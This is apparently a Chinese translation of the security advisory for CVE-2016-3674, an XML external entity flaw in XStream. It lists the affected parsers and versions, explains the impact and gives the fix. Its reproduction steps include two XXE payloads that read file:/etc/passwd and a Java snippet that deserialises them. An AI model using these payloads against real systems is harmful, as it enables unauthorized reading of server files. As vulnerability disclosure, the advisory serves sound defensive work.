# CVE-2016-3674

## 脆弱性

CVE-2016-3674: XStream 的 XML 外部实体(XXE)漏洞

## 影响版本

如果使用默认的 XML 拉解析器(Xpp3 或 kXML2)，则 XStream 不会受到攻击，因为这些解析器类型根本不处理 XML 实体。

在 1.4.8 之前(包括 1.4.8)的所有版本，如果显式地使用以下任一解析器，都将受到影响:

- DOM4J
- DOM
- JDOM
- JDOM2
- StAX 实现
- XOM

XStream 的 HierarchicalStreamDriver 实现现在将显式地关闭外部实体的处理，但并不是所有解析器实现都遵守这个设置。因此，如果显式地使用以下解析器实现之一，XStream 在未来仍然是脆弱的:

- 从 Java 5 运行时及以下的 DOM 实现
- 来自 Java 6 运行时及以下版本的 StAX 实现
- BEA 的 StAX 实现(旧的参考实现)
- XOM

有关解释解析器行为的矩阵，请参阅 FAQ。

## 描述

XStream 支持许多不同的 XML 解析器。其中一些还可以处理默认启用的外部实体。因此，攻击者可以提供经过操作的 XML 作为输入来访问文件系统上的数据，请参阅 XXE 漏洞。

## 重现步骤

攻击者可能会使用外部通用实体或参数实体:

```xml
<?xml version="1.0">
  <!DOCTYPE root [
    <!ELEMENT string (#PCDATA)>
    <!ENTITY content SYSTEM "file:/etc/passwd">
]><string>&content;</string>
```

```xml
<?xml version="1.0">
  <!DOCTYPE root [
    <!ELEMENT string (#PCDATA)>
    <!ENTITY content SYSTEM "file:/etc/passwd">
    %content;
]><string>test</string>
```

使用上面的一个 XML 文档，用一个易受攻击的解析器初始化 XStream，然后解编 XML:

```java
XStream xstream = new XStream();
String s = (String)xstream.fromXML(xml);
```

## 影响

如果 Java 进程具有读访问权限，该漏洞可能允许远程攻击者检索本地文件系统中已知位置的任意文件的内容。

## 解决方案

使用一种 XML 拉解析器实现。
